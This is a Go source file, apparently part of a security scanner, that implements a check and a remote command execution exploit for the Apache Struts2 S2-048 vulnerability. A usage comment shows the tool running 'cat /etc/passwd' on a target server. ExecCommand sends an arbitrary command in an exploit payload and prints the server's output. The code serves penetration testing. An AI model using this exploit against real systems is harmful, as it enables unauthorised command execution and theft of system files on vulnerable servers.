package s2_048

import (
    "fmt"
    "github.com/fatih/color"
    "github.com/yhy0/ChYing/pkg/Jie/scan/Pocs/java/struts2/utils"
    "net/url"
    "strings"
)

/*
ST2SG.exe --url http://192.168.123.128:8080/S2-048/integration/saveGangster.action --vn 48 --mode exec --cmd "cat /etc/passwd" --data "name=fuckit&age=aaa&__checkbox_bustedBefore=true&description=aaa"
*/
func Check(targetUrl string, postData string) {
    respString := utils.PostFunc4Struts2(targetUrl, postData, "", utils.POC_s048_check)
    if utils.IfContainsStr(respString, "6308") {
        color.Red("*Found Struts2-048！")
    } else {
        fmt.Println("Struts2-048 Not Vulnerable.")
    }
}

func ExecCommand(targetUrl string, command string, postData string) {
    respString := utils.PostFunc4Struts2(targetUrl, postData, "", utils.POC_s048_exec(command))
    respString = strings.Replace(url.QueryEscape(respString), "%00", "", -1)
    execResult := utils.GetBetweenStr(respString, "s048execstart", "s048execend")
    fmt.Println(url.QueryUnescape(execResult))
}
